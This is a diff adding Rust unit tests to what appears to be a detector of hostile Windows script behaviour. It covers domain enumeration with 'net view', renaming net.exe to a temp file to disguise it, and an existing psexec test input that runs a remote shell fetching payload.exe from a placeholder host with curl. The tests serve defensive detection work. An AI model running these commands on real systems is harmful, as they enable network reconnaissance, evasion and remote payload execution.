@@ -3776,6 +3776,48 @@ C:\Users\Public\rt.tmp print
     }
 
     #[test]
+    fn net_view_emits_enumeration_trait() {
+        let report = analyze(br#"net view /domain"#, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "net-view" && command == "net view /domain"
+            )),
+            "net view enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_net_alias_view_emits_enumeration_trait() {
+        let script = br#"copy C:\Windows\System32\net.exe C:\Users\Public\nv.tmp
+C:\Users\Public\nv.tmp view \\target.example
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\nv.tmp"#)
+            )),
+            "copied net view alias was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "net-view" && command == r#"net.exe view \\target.example"#
+            )),
+            "copied net view enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
